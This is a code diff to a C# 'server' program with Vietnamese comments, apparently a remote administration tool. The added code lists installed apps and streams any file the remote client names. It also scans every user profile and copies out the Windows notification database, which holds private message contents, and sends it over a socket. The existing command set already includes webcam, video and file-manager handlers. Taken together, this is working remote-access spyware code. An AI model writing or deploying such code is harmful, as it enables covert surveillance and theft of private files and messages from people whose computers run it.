@@ -70,6 +70,128 @@ namespace server
             return a;
         }
 
+        public void listInstalledApps()
+        {
+            try
+            {
+                // Danh sách các đường dẫn Start Menu
+                string[] paths = {
+                    Environment.GetFolderPath(Environment.SpecialFolder.CommonStartMenu), // All Users
+                    Environment.GetFolderPath(Environment.SpecialFolder.StartMenu)       // Current User
+                };
+
+                List<string> appNames = new List<string>();
+
+                foreach (string root in paths)
+                {
+                    if (Directory.Exists(root))
+                    {
+                        // Quét tất cả file .lnk (Shortcut)
+                        string[] files = Directory.GetFiles(root, "*.lnk", SearchOption.AllDirectories);
+                        foreach (string f in files)
+                        {
+                            string name = Path.GetFileNameWithoutExtension(f);
+                            if (!appNames.Contains(name)) // Tránh trùng lặp
+                            {
+                                appNames.Add(name);
+                            }
+                        }
+                    }
+                }
+
+                // Gửi số lượng
+                Program.nw.WriteLine(appNames.Count.ToString());
+                Program.nw.Flush();
+
+                // Gửi tên từng App
+                foreach (string name in appNames)
+                {
+                    Program.nw.WriteLine(name);
+                    Program.nw.Flush();
+                }
+            }
+            catch 
+            { 
+                Program.nw.WriteLine("0"); Program.nw.Flush(); 
+            }
+        }
+
+        public void getNotiDB()
+        {
+            string bestPath = "";
+            long maxLen = -1;
+
+            try
+            {
+                string usersPath = @"C:\Users";
+                if (Directory.Exists(usersPath))
+                {
+                    // 1. Quét TẤT CẢ các user trong máy
+                    foreach (string dir in Directory.GetDirectories(usersPath))
+                    {
+                        string checkPath = Path.Combine(dir, @"AppData\Local\Microsoft\Windows\Notifications\wpndatabase.db");
+                        
+                        if (File.Exists(checkPath))
+                        {
+                            try 
+                            {
+                                // Lấy kích thước file
+                                long len = new FileInfo(checkPath).Length;
+                                
+                                // Nếu tìm thấy file nặng hơn file trước đó -> Đây mới là file của người dùng chính
+                                if (len > maxLen)
+                                {
+                                    maxLen = len;
+                                    bestPath = checkPath;
+                                }
+                            }
+                            catch {}
+                        }
+                    }
+                }
+
+                if (bestPath != "" && maxLen > 0)
+                {
+                    // 2. Copy file tốt nhất tìm được
+                    string tempPath = Path.GetTempFileName();
+                    
+                    using (FileStream source = new FileStream(bestPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                    {
+                        using (FileStream dest = new FileStream(tempPath, FileMode.Create))
+                        {
+                            source.CopyTo(dest);
+                        }
+                    }
+
+                    // 3. Gửi kích thước
+                    long len = new FileInfo(tempPath).Length;
+                    Program.nw.WriteLine(len.ToString());
+                    Program.nw.Flush();
+
+                    // 4. Gửi dữ liệu
+                    using (FileStream fs = new FileStream(tempPath, FileMode.Open, FileAccess.Read))
+                    {
+                        byte[] buffer = new byte[4096];
+                        int bytesRead;
+                        while ((bytesRead = fs.Read(buffer, 0, buffer.Length)) > 0)
+                        {
+                            Program.client.Send(buffer, 0, bytesRead, SocketFlags.None);
+                        }
+                    }
+                    
+                    try { File.Delete(tempPath); } catch { }
+                }
+                else
+                {
+                    // Không tìm thấy file nào -> Gửi 0
+                    Program.nw.WriteLine("0"); Program.nw.Flush();
+                }
+            }
+            catch (Exception ex)
+            {
+                Program.nw.WriteLine("0"); Program.nw.Flush();
+            }
+        }
         public String getvalue(ref RegistryKey a,ref String link,ref String valueName)
         {
             a=a.OpenSubKey(link);
@@ -195,7 +317,44 @@ namespace server
                             }
                             break;
                         }
+                    case "DOWNLOAD":
+                    {
+                        // 1. Nhận đường dẫn file cần tải
+                        string path = Program.nr.ReadLine();
+                        
+                        if (File.Exists(path))
+                        {
+                            try
+                            {
+                                // 2. Gửi kích thước file trước
+                                long fileSize = new FileInfo(path).Length;
+                                Program.nw.WriteLine(fileSize.ToString());
+                                Program.nw.Flush();
 
+                                // 3. Gửi dữ liệu file (Chia nhỏ từng cục 4KB để gửi)
+                                using (FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Read))
+                                {
+                                    byte[] buffer = new byte[4096]; // 4KB Buffer
+                                    int bytesRead;
+                                    while ((bytesRead = fs.Read(buffer, 0, buffer.Length)) > 0)
+                                    {
+                                        Program.client.Send(buffer, 0, bytesRead, SocketFlags.None);
+                                    }
+                                }
+                            }
+                            catch 
+                            { 
+                                // Nếu đang gửi mà lỗi (file bị khóa, mất mạng...)
+                            }
+                        }
+                        else
+                        {
+                            // Báo lỗi: Gửi kích thước 0
+                            Program.nw.WriteLine("0");
+                            Program.nw.Flush();
+                        }
+                        break;
+                    }
                     case "QUIT": return;
                 }
             }
@@ -813,6 +972,8 @@ namespace server
                             case "VIDEO": video(); break;
                             case "WEBCAM": webcam(); break; // <--- Đảm bảo có dòng này
                             case "EXPLORER": fileManager(); break;
+                            case "GET_INSTALLED": listInstalledApps(); break;
+                            case "GET_NOTI": getNotiDB(); break;
                             case "QUIT": clientConnected = false; break;
                         }
                     }
